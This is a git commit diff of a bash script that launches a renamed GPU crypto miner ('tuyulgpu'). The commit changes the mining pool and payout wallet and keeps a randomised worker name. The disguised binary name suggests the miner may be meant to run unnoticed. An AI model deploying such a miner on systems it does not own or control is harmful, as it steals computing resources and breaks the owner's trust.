52625b3e27f18bc58e3070458756740750759760
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2021-06-20 01:19:27 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
-POOL=asia-eth.2miners.com:2020
-WALLET=0xf77eee9bcb82e019a531f2a76ed415ae1f542872
+POOL=ethash.unmineable.com:3333
+WALLET=BTT:TD7L1BXFTy1qq7VxAc2pPR2eQCZFHFzyXo
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 chmod +x tuyulgpu
+
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
